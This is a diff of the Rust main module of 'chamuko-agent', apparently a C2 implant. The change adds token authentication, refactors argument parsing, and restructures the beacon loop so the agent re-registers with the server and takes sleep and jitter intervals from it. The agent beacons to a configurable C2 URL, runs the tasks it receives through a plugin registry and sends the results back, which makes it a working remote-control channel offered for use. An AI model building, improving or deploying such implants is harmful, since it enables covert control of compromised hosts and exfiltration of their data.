@@ -4,12 +4,12 @@ use std::time::Duration;
 
 use chamuko_core::PluginRegistry;
 use chamuko_plugin_api::LifecycleEvent;
-use chamuko_protocol::{AgentInfo, TaskResult};
+use chamuko_protocol::{AgentInfo, Task, TaskResult};
 
 mod client;
 mod commands;
 
-use client::C2Client;
+use client::{C2Client, C2Error};
 use commands::CoreCommands;
 
 struct Config {
@@ -17,6 +17,7 @@ struct Config {
     sleep: u64,
     jitter: u64,
     name: String,
+    token: Option<String>,
     once: bool,
 }
 
@@ -46,71 +47,79 @@ fn default_name() -> String {
     option_env!("CHAMUKO_NAME").unwrap_or("").to_string()
 }
 
+fn default_token() -> Option<String> {
+    option_env!("CHAMUKO_TOKEN")
+        .filter(|t| !t.is_empty())
+        .map(str::to_string)
+}
+
 fn parse_u64(s: &str, fallback: u64) -> u64 {
     s.parse().unwrap_or(fallback)
 }
 
+const HELP: &str = "chamuko-agent\n\
+                    --url <url>     C2 server URL\n\
+                    --sleep <s>     base beacon sleep seconds\n\
+                    --jitter <s>    max random jitter seconds\n\
+                    --name <name>   agent label\n\
+                    --token <tok>   C2 auth token\n\
+                    --once          run a single beacon then exit\n\
+                    --help          show this help";
+
 impl Config {
     fn from_args() -> Self {
-        let mut c2_url = default_c2_url();
-        let mut sleep = default_sleep();
-        let mut jitter = default_jitter();
-        let mut name = default_name();
-        let mut once = false;
+        let mut config = Self {
+            c2_url: default_c2_url(),
+            sleep: default_sleep(),
+            jitter: default_jitter(),
+            name: default_name(),
+            token: default_token(),
+            once: false,
+        };
 
         let args: Vec<String> = env::args().skip(1).collect();
         let mut i = 0;
         while i < args.len() {
+            let next = args.get(i + 1).cloned();
+            let mut consumed = true;
             match args[i].as_str() {
-                "--url" | "-u" => {
-                    i += 1;
-                    if let Some(v) = args.get(i) {
-                        c2_url = v.clone();
-                    }
+                "--url" | "-u" => match next {
+                    Some(v) => config.c2_url = v,
+                    None => consumed = false,
+                },
+                "--sleep" | "-s" => match next {
+                    Some(v) => config.sleep = parse_u64(&v, config.sleep),
+                    None => consumed = false,
+                },
+                "--jitter" | "-j" => match next {
+                    Some(v) => config.jitter = parse_u64(&v, config.jitter),
+                    None => consumed = false,
+                },
+                "--name" | "-n" => match next {
+                    Some(v) => config.name = v,
+                    None => consumed = false,
+                },
+                "--token" | "-t" => match next {
+                    Some(v) => config.token = Some(v).filter(|t: &String| !t.is_empty()),
+                    None => consumed = false,
+                },
+                "--once" => {
+                    config.once = true;
+                    consumed = false;
                 }
-                "--sleep" | "-s" => {
-                    i += 1;
-                    if let Some(v) = args.get(i) {
-                        sleep = parse_u64(v, sleep);
-                    }
-                }
-                "--jitter" | "-j" => {
-                    i += 1;
-                    if let Some(v) = args.get(i) {
-                        jitter = parse_u64(v, jitter);
-                    }
-                }
-                "--name" | "-n" => {
-                    i += 1;
-                    if let Some(v) = args.get(i) {
-                        name = v.clone();
-                    }
-                }
-                "--once" => once = true,
                 "--help" | "-h" => {
-                    println!(
-                        "chamuko-agent\n\
-                         --url <url>     C2 server URL\n\
-                         --sleep <s>     base beacon sleep seconds\n\
-                         --jitter <s>    max random jitter seconds\n\
-                         --name <name>   agent label\n\
-                         --once          run a single beacon then exit\n\
-                         --help          show this help"
-                    );
+                    println!("{HELP}");
                     std::process::exit(0);
                 }
-                other => eprintln!("unknown argument: {other}"),
+                other => {
+                    eprintln!("unknown argument: {other}");
+                    consumed = false;
+                }
             }
-            i += 1;
+            i += if consumed { 2 } else { 1 };
         }
 
-        Self {
-            c2_url,
-            sleep,
-            jitter,
-            name,
-            once,
-        }
+        config
     }
 }
 
@@ -123,12 +132,8 @@ fn jitter_sleep(base: u64, jitter: u64) {
     std::thread::sleep(Duration::from_secs(base + extra));
 }
 
-fn execute_task(
-    registry: &mut PluginRegistry,
-    task: &chamuko_protocol::Task,
-) -> TaskResult {
-    let args: Vec<String> = task.args.clone();
-    match registry.execute(&task.command, &args) {
+fn execute_task(registry: &mut PluginRegistry, task: &Task) -> TaskResult {
+    match registry.execute(&task.command, &task.args) {
         Some(Ok(out)) => TaskResult {
             task_id: task.id.clone(),
             output: out.stdout,
@@ -150,66 +155,59 @@ fn execute_task(
     }
 }
 
-fn main() -> ExitCode {
-    let config = Config::from_args();
-
-    let mut registry = PluginRegistry::new();
-    let core = CoreCommands::new();
-    if let Err(e) = registry.register(Box::new(core)) {
-        eprintln!("failed to register core plugin: {e}");
-        return ExitCode::FAILURE;
-    }
-
-    let mut failures = registry.dispatch(LifecycleEvent::Startup);
-    for f in &failures {
-        eprintln!("{f}");
-    }
-
+/// Registers with the C2 and adopts the sleep/jitter it hands back.
+fn register(
+    client: &C2Client,
+    info: &AgentInfo,
+    sleep: &mut u64,
+    jitter: &mut u64,
+) -> Result<String, C2Error> {
+    let resp = client.register(info, *sleep, *jitter)?;
+    *sleep = resp.sleep;
+    *jitter = resp.jitter;
     eprintln!(
-        "chamuko-agent: {} plugin(s); C2={} sleep={}s jitter={}s name='{}'",
-        registry.len(),
-        config.c2_url,
-        config.sleep,
-        config.jitter,
-        config.name
+        "registered as agent {} (sleep={}s jitter={}s)",
+        resp.id, resp.sleep, resp.jitter
     );
+    Ok(resp.id)
+}
 
-    let client = C2Client::new(config.c2_url.clone());
+fn run(config: &Config, registry: &mut PluginRegistry) -> Result<(), C2Error> {
+    let client = C2Client::new(config.c2_url.clone(), config.token.clone());
+    let info = AgentInfo::local(config.name.clone());
 
-    let mut info = AgentInfo::local(config.name.clone());
-    let id = match client.register(&info) {
-        Ok(resp) => {
-            info.id = resp.id.clone();
-            info.id.clone()
-        }
-        Err(e) => {
-            eprintln!("registration failed: {e}");
-            failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
-            for f in &failures {
-                eprintln!("{f}");
-            }
-            return ExitCode::FAILURE;
-        }
-    };
-    eprintln!("registered as agent {id}");
+    let mut sleep = config.sleep;
+    let mut jitter = config.jitter;
+    let mut id = register(&client, &info, &mut sleep, &mut jitter)?;
 
     loop {
-        jitter_sleep(config.sleep, config.jitter);
-
-        let tasks = match client.beacon(&id) {
-            Ok(resp) => resp.tasks,
+        let beacon = match client.beacon(&id) {
+            Ok(beacon) => beacon,
+            Err(e) if e.is_unknown_agent() => {
+                eprintln!("C2 no longer knows {id}; re-registering");
+                id = register(&client, &info, &mut sleep, &mut jitter)?;
+                continue;
+            }
             Err(e) => {
                 eprintln!("beacon error: {e}");
                 if config.once {
-                    break;
+                    return Ok(());
                 }
+                jitter_sleep(sleep, jitter);
                 continue;
             }
         };
 
-        let mut results = Vec::with_capacity(tasks.len());
-        for task in &tasks {
-            let result = execute_task(&mut registry, task);
+        if let Some(value) = beacon.sleep {
+            sleep = value;
+        }
+        if let Some(value) = beacon.jitter {
+            jitter = value;
+        }
+
+        let mut results = Vec::with_capacity(beacon.tasks.len());
+        for task in &beacon.tasks {
+            let result = execute_task(registry, task);
             if let Some(err) = &result.error {
                 eprintln!("task {} error: {err}", task.id);
             }
@@ -218,11 +216,46 @@ fn main() -> ExitCode {
 
         if let Err(e) = client.post_results(&id, results) {
             eprintln!("failed to post results: {e}");
+            if e.is_unknown_agent() {
+                id = register(&client, &info, &mut sleep, &mut jitter)?;
+                continue;
+            }
         }
 
         if config.once {
-            break;
+            return Ok(());
         }
+        jitter_sleep(sleep, jitter);
+    }
+}
+
+fn main() -> ExitCode {
+    let config = Config::from_args();
+
+    let mut registry = PluginRegistry::new();
+    if let Err(e) = registry.register(Box::new(CoreCommands::new())) {
+        eprintln!("failed to register core plugin: {e}");
+        return ExitCode::FAILURE;
+    }
+
+    let mut failures = registry.dispatch(LifecycleEvent::Startup);
+    eprintln!(
+        "chamuko-agent: {} plugin(s); C2={} sleep={}s jitter={}s name='{}' auth={}",
+        registry.len(),
+        config.c2_url,
+        config.sleep,
+        config.jitter,
+        config.name,
+        if config.token.is_some() { "token" } else { "none" }
+    );
+
+    if let Err(e) = run(&config, &mut registry) {
+        eprintln!("agent error: {e}");
+        failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
+        for f in &failures {
+            eprintln!("{f}");
+        }
+        return ExitCode::FAILURE;
     }
 
     failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
